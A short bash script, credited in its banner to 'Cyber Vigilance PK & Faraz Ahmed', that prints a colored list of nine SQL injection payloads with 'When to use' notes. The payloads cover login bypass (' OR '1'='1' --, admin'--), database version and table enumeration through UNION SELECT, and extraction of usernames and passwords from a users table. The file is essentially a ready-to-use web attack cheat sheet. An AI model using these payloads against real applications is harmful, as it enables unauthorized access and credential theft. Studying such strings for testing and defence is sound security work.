#!/bin/bash

# Function to display a random color
random_color() {
    colors=("31" "32" "33" "34" "35" "36")
    echo -e "\e[1;${colors[$RANDOM % ${#colors[@]}]}m"
}

# Display the banner
clear
echo -e "$(random_color)███████████████████████████████████████████████████████████████████████"
echo -e "$(random_color)██                                                                  ██"
echo -e "$(random_color)██       SQL Injection Payloads Tool                                ██"
echo -e "$(random_color)██       Made by Cyber Vigilance PK & Faraz Ahmed                    ██"
echo -e "$(random_color)██                                                                  ██"
echo -e "$(random_color)███████████████████████████████████████████████████████████████████████"
echo -e "\e[0m"

# Payload list and descriptions
payloads=(
    "1=1 --"
    "' OR '1'='1' --"
    "' UNION SELECT null, version()"
    "' AND 1=2 UNION SELECT null, table_name FROM information_schema.tables"
    "' OR 'a'='a"
    "admin'--"
    "' OR 1=1#"
    "' UNION SELECT username, password FROM users"
    "' AND '1'='1' AND '%'='%'"
)

descriptions=(
    "Basic bypass of simple authentication"
    "Bypass authentication with string comparison"
    "Retrieving the version of the database"
    "Listing all tables in the database"
    "Bypass filters that prevent some injections"
    "Login as admin with weak filtering"
    "Using comments to bypass validation"
    "Extracting sensitive data from user table"
    "Bypassing with double conditions"
)

# Display the payloads with descriptions
for i in "${!payloads[@]}"; do
    echo -e "$(random_color)Payload: ${payloads[$i]}"
    echo -e "$(random_color)When to use: ${descriptions[$i]}"
    echo -e "\e[0m"
    echo -e ""  # Print an empty line for better readability
done

# Prompt user to press any key to exit
echo -e "\n$(random_color)Press any key to exit..."
read -n 1
